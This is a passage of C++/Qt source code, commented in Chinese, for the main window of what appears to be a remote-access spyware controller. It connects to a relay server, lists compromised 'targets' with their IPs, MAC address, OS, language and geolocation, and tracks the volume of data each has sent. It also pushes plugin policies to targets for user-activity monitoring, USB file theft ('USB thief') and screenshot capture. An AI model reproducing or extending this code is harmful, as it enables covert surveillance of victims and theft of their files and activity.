			pluginCxt->dwUpdateType = atoi(pParam);

			pParam = pDelim + 1;
			pluginCxt->lpszProcList = strdup(pParam);

		} while(false);

		if (!pDelim)
		{
			// Config file is corruptted
			//
			MessageBoxA(this->Handle, "插件配置文件不正确!", "提示", MB_OK | MB_ICONINFORMATION);
			AdkFree(pluginCxt);
			return false;
		}
		else
		{
			PlgCxtVect[pluginCxt->dwPluginId] = pluginCxt;
			plgCount++;
		}

		// Read next plugin info 
		//
		pParam = pParamNext + 2;
		if (UINT(pParam - rBuf) >= numRead)
		{
			break;
		}

	} while(true);

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 读配置文件
//
bool MainDlg::ReadIniFile()
{
	ui.statusBar->showMessage(QString::fromLocal8Bit("读取配置文件"));
	AddStatusInfo(STATUS_INFO, L"读取配置文件");
	
	std::wstring iniFile = GetExePath() + L"\\setting.ini";
	
	if ( !AdkFileIsExistW(iniFile.c_str()) )
	{
		QMessageBox::critical(this, QString::fromLocal8Bit("提示"), 
			QString::fromLocal8Bit("出现异常错误：没有发现配置文件!"));

		return false;
	}

	this->aniDaemonIpAddr = WideToAnsi(ReadStringPolicyFromLocal(L"Daemon", L"IpAddr", iniFile.c_str()));
	this->nPortForTarget = ReadValueFromLocal(L"Daemon", L"PortForTarget", iniFile.c_str());
	this->nCtrPortForControl = ReadValueFromLocal(L"Daemon", L"CtrPortForControl", iniFile.c_str());
	this->nDataPortForControl = ReadValueFromLocal(L"Daemon", L"DataPortForControl", iniFile.c_str());

	m_connDlg.SetIpAddress(QString::fromStdString(this->aniDaemonIpAddr));
	m_connDlg.SetTargetPort(QString("%1").arg(this->nDataPortForControl));
	m_connDlg.SetCtrlPort(QString("%1").arg(this->nCtrPortForControl));

	this->bAutoLogin = ReadValueFromLocal(L"Control", L"AutoLogin", iniFile.c_str());

	if ( this->bAutoLogin )
	{
		m_connDlg.SetAutoConn(true);

		std::string aniPassHash = WideToAnsi(ReadStringPolicyFromLocal(L"Control", L"PassHash", iniFile.c_str()));

		if (aniPassHash.length() == 0)
		{
			ui.statusBar->showMessage(QString::fromLocal8Bit("配置文件出错，恢复默认配置文件"));
			AddStatusInfo(STATUS_INFO, L"配置文件出错，恢复默认配置文件");
			this->bAutoLogin = false;
		}
		else
		{
			// 进行反Base64编码
			//
			BYTE passMd5[32];
			AdkBase64Decode(aniPassHash.c_str(), aniPassHash.length(), passMd5, 32);

			CopyMemory(this->byPassMd5, passMd5, 16);
		}
	}

	this->aniLocalTarFileDir = WideToAnsi(ReadStringPolicyFromLocal(L"Control", L"LocalTargetPath", iniFile.c_str()));
	if ( this->aniLocalTarFileDir.length() == 0)
	{
		std::string path = WideToAnsi(GetExePath())+"\\Data";
		this->aniLocalTarFileDir = path.c_str();
	}

	//qDebug() << this->aniLocalTarFileDir.c_str();
	CreateDirectoryA(this->aniLocalTarFileDir.c_str(), NULL);

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 写配置文件
//
void MainDlg::WriteIniFile()
{
	ui.statusBar->showMessage(QString::fromLocal8Bit("更新配置文件"));
	AddStatusInfo(STATUS_INFO, L"更新配置文件");

	std::wstring iniFile = GetExePath() + L"\\setting.ini";

	WritePrivateProfileStringW(L"Daemon", L"IpAddr", AnsiToWide(this->aniDaemonIpAddr).c_str(), iniFile.c_str());
	WritePolicyToLocal(L"Daemon", L"PortForTarget", this->nDataPortForControl, iniFile.c_str());
	WritePolicyToLocal(L"Daemon", L"CtrPortForControl", this->nCtrPortForControl, iniFile.c_str());
	WritePolicyToLocal(L"Daemon", L"DataPortForControl", this->nDataPortForControl, iniFile.c_str());
	WritePolicyToLocal(L"Control", L"AutoLogin", this->bAutoLogin, iniFile.c_str());

	if ( this->bAutoLogin )
	{
		CHAR encode[MAX_PATH] = {0};
		AdkBase64Encode(this->byPassMd5, 16, encode, MAX_PATH);
		WritePrivateProfileStringW(L"Control", L"PassHash", AnsiToWide(encode).c_str(), iniFile.c_str());
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 连接至中转
//
void MainDlg::ConnectToDaemon()
{
	assert(this->ctrConn == NULL);

	char info[MAX_PATH] = {0};
	sprintf(info, "正在连接中转服务器 %s:%d ...", aniDaemonIpAddr.c_str(), nCtrPortForControl);

	ui.statusBar->showMessage(QString::fromLocal8Bit(info));
	AddStatusInfo(STATUS_INFO, info);

	bool bRet = ConnectToServer(this->aniDaemonIpAddr.c_str(),this->nCtrPortForControl, true);

	if (bRet == false)
	{
		SendMessage(this->Handle, WM_CONTROL_CONNFAILED, NULL, NULL);
	}

	m_waitDlg->show();
	ui.actStart->setEnabled(false);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化目标列表
//
void MainDlg::InitialTargetData()
{
	ui.statusBar->showMessage(QString::fromLocal8Bit("查询目标列表"));
	AddStatusInfo(STATUS_INFO, L"查询目标列表");
	DM->QueryTargetList();

	ui.statusBar->showMessage(QString::fromLocal8Bit("枚举目标数据"));
	AddStatusInfo(STATUS_INFO, L"枚举目标数据");
	std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tar = (*i).second;

		// 检查目标本地目录
		//
		tar->CheckAndCreateDataDir();

		// 读取磁盘盘符列表
		//
		DM->QueryTargetLogicDriver(tar->dwTargetID, tar->logicDriverSet);

		// 查询插件列表
		//
		DM->QueryTargetPluginList(tar->dwTargetID, tar->pluginVect);
	}

	// 展开目标列表
	for (int i = 0; i < ui.trTarget->topLevelItemCount(); i++)
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);
		item->setExpanded(true);
	}
}

 // ////////////////////////////////////////////////////////////////////////////////
 // @private 下线
 //
void MainDlg::ControlOffline()
{
	this->ctrOnlineFlag = false;    
	this->ctrConn = NULL;

	ui.statusBar->showMessage(QString::fromLocal8Bit("断开所有数据连接"));
	AddStatusInfo(STATUS_INFO, "断开所有数据连接");

	std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tarBlock = (*i).second;
		if (tarBlock == NULL)
		{
			continue;
		}

		if ( tarBlock->frmTarControl )
		{
			//tarBlock->frmTarControl->tarBlock = tarBlock;
			tarBlock->frmTarControl->TargetOffline();
		}

		if (tarBlock->tarConn)
		{
			tarBlock->bTarConnOnline = false;
			tarBlock->tarConn->CloseConnection();
			tarBlock->tarConn = NULL;
		}

		if (tarBlock->tarStatus == TARONLINE)
		{
			tarBlock->tarStatus = TAROFFLINE;

			tarBlock->treeNode->setText(2, QString::fromLocal8Bit("离线"));

			ChangeTargetStatus(tarBlock->treeNode, tarBlock, false);
			UpdateTargetDisplay(tarBlock->treeNode);

			// 改变颜色
			for (int i = 0; i < 11; i++)
			{
				tarBlock->treeNode->setForeground(i, QBrush(QColor(0,0,0)));
			}
		}
	}

	// 停止发送心跳包
	m_PNGTimer.stop();

	ui.actStart->setEnabled(true);
	ui.actStop->setEnabled(false);

	UpateTargetCount();
	//RefreshTargetList();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加目标节点
//
void MainDlg::AddTargetNode(Target* tar)
{
	// 添加节点
	QTreeWidgetItem* targetItem = new QTreeWidgetItem;
	//targetItem->setIcon(0, QIcon(QPixmap(":/image/outline.png")));
	targetItem->setText(0, QString("%1").arg(tar->dwTargetID));
	targetItem->setText(1, QString::fromLocal8Bit(tar->aniTargetName.c_str()));
	targetItem->setText(2, QString::fromLocal8Bit("离线"));
	targetItem->setText(3, QString::fromLocal8Bit(ConvertBuildNumberToStr(tar->dwOsBuildNumber).c_str()));
	targetItem->setText(4, tar->aniRemPublicIpAddr.c_str());
	targetItem->setText(5, tar->aniRemLocalIpAddr.c_str());

	// 根据 IP 获取所在地
	std::string country, location;
	m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);

	targetItem->setText(6, QString::fromLocal8Bit(country.c_str()));
	
	//srand(GetTickCount());

	// 数据流量
	WCHAR iniPath[MAX_PATH] = {0};
	wsprintfW(iniPath, L"%s\\Data\\%d\\flow_statistics.ini", GetExePath().c_str(), tar->dwTargetID);
	std::wstring iniFile = GetExePath() + L"\\flow_statistics.ini";
	unsigned int flowStatistics = ReadValueFromLocal(L"FlowStatistics", L"flow", iniPath);

	char text[256] = {0};
	sprintf(text, "%.2f MB", ( (double)flowStatistics ) / 1024 / 1024 );
	targetItem->setText(7, text);
	targetItem->setText(9, tar->aniRemMacAddr.c_str());

	tar->m_sysType = GetSystemType(tar->dwOsBuildNumber);

	ChangeTargetStatus(targetItem, tar, false);

	// 扩展信息
	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "语言中性") )
		{
			targetItem->setText(10, QString::fromLocal8Bit(szLang));
		}
	}
	else
	{
		targetItem->setText(10, QString::fromLocal8Bit("未知"));
	}

	if ( tar->m_netEnv > 4 )
		tar->m_netEnv = 4;

	targetItem->setText(8, QString::fromStdWString(std::wstring(TargetDlg::Net_description[tar->m_netEnv])));
	targetItem->setTextAlignment(8, Qt::AlignCenter);

	// 存储 target 指针
	targetItem->setData(0, Qt::UserRole, (unsigned int)tar);

	// 在 tar 中保存一份 item 指针
	tar->treeNode = targetItem;

	if ( tar->m_favorite )
		targetItem->setIcon(11, QIcon(QPixmap(":/image/star.png")));

	m_itemList.push_back(targetItem);

	AddTargetNode(targetItem);

	UpateTargetCount();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 在日志窗口中添加消息
//
void MainDlg::AddStatusInfo(STATUS_LEVEL sl, const wchar_t* lpwzInfo)
{
	ui.tbLog->setRowCount(ui.tbLog->rowCount()+1);

	char* pixmap[] = {
		":/image/info.png", 
		":/image/info.png",
		":/image/error.png",
		":/image/error.png"};

	QString icoPath = QString(pixmap[sl]);
	QIcon icon(icoPath);

	int row = ui.tbLog->rowCount()-1;
	ui.tbLog->setItem(row, 0, new QTableWidgetItem(
		icon, QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss")));
	ui.tbLog->setItem(row, 1, new QTableWidgetItem(QString::fromStdWString(std::wstring(lpwzInfo))));

	ui.tbLog->scrollToBottom();

	WriteLogToFile(lpwzInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 
//
void MainDlg::AddStatusInfo(STATUS_LEVEL sl, const char* lpszInfo)
{
	AddStatusInfo(sl, AnsiToWide(std::string(lpszInfo)).c_str());
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 任务栏闪烁
//
void MainDlg::FlashTrayIcon()
{
	if ( m_iconToggle )
	{
		m_tray->setIcon(QApplication::windowIcon());
	}
	else
	{
		m_tray->setIcon(QIcon());
	}

	m_iconToggle = !m_iconToggle;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 任务栏响应
//
void MainDlg::ProcessTrayEvent(QSystemTrayIcon::ActivationReason reason)
{
	if ( QSystemTrayIcon::Trigger == reason )
	{
		m_trayFlashTimer->stop();
		m_tray->setIcon(QApplication::windowIcon());
		this->showNormal();
		this->activateWindow();
	}
}

void MainDlg::ActiveMainWindow()
{
	m_targetDlgContainer->hide();
	this->showNormal();
	this->activateWindow();
}

void MainDlg::UpdateTargetDisplay( QTreeWidgetItem* item )
{
	if ( !ItemCanShow(item) )
	{
		QTreeWidgetItem* parent = item->parent();
		if ( parent )
		{
			parent->takeChild(parent->indexOfChild(item));

			if ( 0 == parent->childCount() )
				ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));
		}
	}
	else
	{
		QTreeWidgetItem* parent = item->parent();
		if ( !parent )
			AddTargetNode(item);
	}
}

void MainDlg::ModifyPluginPolicy( unsigned int pTarget, int pluginNumber )
{
	if ( !this->ctrOnlineFlag )
	{
		QMessageBox::critical(
			0,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("只有连接中转服务器，才能进行插件策略配置!"));
		return;
	}

	Target* tarBlock = (Target*)pTarget;

	PolicyDlg dlg(0, tarBlock, pluginNumber);

	if ( QDialog::Accepted == dlg.exec() )
	{

		PUSER_ACT_CFG lpUserActCfgData = NULL;
		PUSB_THIEF_CONFIG lpUsbThiefCfgData = NULL;
		PCAPTURE_CONFIG lpCaptureCfgData = NULL;

		if ( !dlg.GetUserActionCfgInfo(lpUserActCfgData) 
			|| !dlg.GetUsbCfgInfo(lpUsbThiefCfgData)
			|| !dlg.GetScreenshotCfgInfo(lpCaptureCfgData) )
		{
			MsgBoxInfoExW(Handle, L"插件策略设置失败!");
			SetStatusInfoW(STATUS_ERROR, L"插件策略设置失败!");
			return;
		}


		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
			2,
			(PBYTE)lpUserActCfgData,
			lpUserActCfgData->dwSize);
		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
			3,
			(PBYTE)lpUsbThiefCfgData,
			lpUsbThiefCfgData->dwSize);

		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
			4,
			(PBYTE)lpCaptureCfgData,
			lpCaptureCfgData->dwSize);

		FrmMain->ctrConn->Send_PLI(tarBlock->dwTargetID);         // 重新获取目标插件信息


		if ( lpUserActCfgData )
		{
			AdkFree(lpUserActCfgData);
		}

		if ( lpUsbThiefCfgData )
		{
			AdkFree(lpUsbThiefCfgData);
		}

		if ( lpCaptureCfgData )
		{
			AdkFree(lpCaptureCfgData);
		}

		MsgBoxInfoExW(NULL, L"插件策略设置成功!");
		SetStatusInfoW(STATUS_INFO, L"插件策略设置成功!");

		if ( tarBlock->frmTarControl )
		{
			tarBlock->frmTarControl->UpdateCapturePolicy();
			tarBlock->frmTarControl->activateWindow();
		}
	}
}
